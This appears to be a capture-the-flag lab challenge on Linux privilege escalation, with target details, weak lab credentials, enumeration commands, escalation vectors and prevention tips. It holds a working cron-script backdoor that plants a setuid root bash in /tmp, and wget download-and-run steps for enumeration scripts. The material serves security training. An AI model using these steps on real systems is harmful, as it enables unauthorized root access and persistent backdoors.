# Challenge: Linux Privilege Escalation

## Objective
Gain root access on a Linux system by exploiting misconfigurations and vulnerabilities to escalate privileges from a regular user account.

## Target Information
- **Target IP**: 192.168.1.30
- **Initial Access**: SSH with weak credentials
- **Goal**: Obtain root shell and retrieve the flag

## Challenge Description
You have gained initial access to a Linux system with a low-privileged user account. Your task is to escalate your privileges to root level by identifying and exploiting system misconfigurations, vulnerable binaries, or other privilege escalation vectors.

## Learning Objectives
- Understand common Linux privilege escalation techniques
- Learn to identify SUID binaries and their exploitation
- Practice enumeration of system configurations
- Understand cron job vulnerabilities
- Learn about file permission misconfigurations

## Initial Access
```bash
# SSH to the target with discovered credentials
ssh user1@192.168.1.30
# Password: password123

# Alternative user account
ssh user2@192.168.1.30
# Password: admin
```

## Enumeration Checklist

### System Information
```bash
# Basic system info
uname -a
cat /etc/os-release
whoami
id

# Check sudo privileges
sudo -l

# List users and groups
cat /etc/passwd
cat /etc/group
```

### File System Enumeration
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Find SGID binaries
find / -perm -2000 2>/dev/null

# World-writable files
find / -perm -002 2>/dev/null

# Files owned by current user
find / -user $(whoami) 2>/dev/null
```

### Process and Service Enumeration
```bash
# Running processes
ps aux

# Network connections
netstat -tulpn

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

### Configuration Files
```bash
# Check for interesting config files
ls -la /home/*/
cat /home/*/.bash_history
find /etc -readable 2>/dev/null | grep -v proc
```

## Privilege Escalation Vectors

### Vector 1: SUID Binary Exploitation
```bash
# Look for vulnerable SUID binaries
find / -perm -4000 2>/dev/null

# Check if any SUID binaries can be exploited
# Example: If you find /tmp/vulnerable_binary
/tmp/vulnerable_binary -p
```

### Vector 2: Cron Job Exploitation
```bash
# Check cron jobs running as root
cat /etc/crontab

# Look for world-writable scripts in cron
ls -la /usr/local/bin/backup.sh

# If writable, modify the script
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /usr/local/bin/backup.sh

# Wait for cron to execute, then use the backdoor
/tmp/rootbash -p
```

### Vector 3: Sudo Misconfigurations
```bash
# Check sudo configuration
sudo -l

# Look for commands that can be run as root
# Check GTFOBins for exploitation techniques
```

### Vector 4: Kernel Exploits
```bash
# Check kernel version
uname -r

# Search for known exploits
searchsploit linux kernel $(uname -r)
```

## Tools and Scripts
```bash
# LinEnum script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## Flag Location
Once you achieve root access, the flag can be found at:
```bash
cat /root/flag.txt
```

## Common Techniques

### 1. SUID Binary Abuse
- Look for unusual SUID binaries
- Check GTFOBins for exploitation methods
- Focus on binaries in unusual locations

### 2. Writable Cron Scripts
- Identify scripts executed by cron as root
- Check if they're world-writable
- Modify to create backdoors

### 3. Environment Variables
- Check PATH manipulation opportunities
- Look for scripts that don't use absolute paths

### 4. File Permissions
- World-writable configuration files
- Readable shadow files
- Misconfigured service files

## Prevention Measures
- Regular security audits of SUID binaries
- Proper file permission management
- Secure cron job configurations
- Principle of least privilege
- Regular system updates
- Use of tools like Lynis for security scanning

## Advanced Techniques
```bash
# Check for capabilities
getcap -r / 2>/dev/null

# Look for interesting environment variables
env

# Check for Docker or container escape opportunities
ls -la /.dockerenv
cat /proc/1/cgroup
```

## Difficulty: Medium
**Points**: 250
**Estimated Time**: 60-90 minutes

## Success Criteria
- Achieve root shell access
- Retrieve the flag from /root/flag.txt
- Document the privilege escalation method used
- Understand the vulnerability that allowed escalation
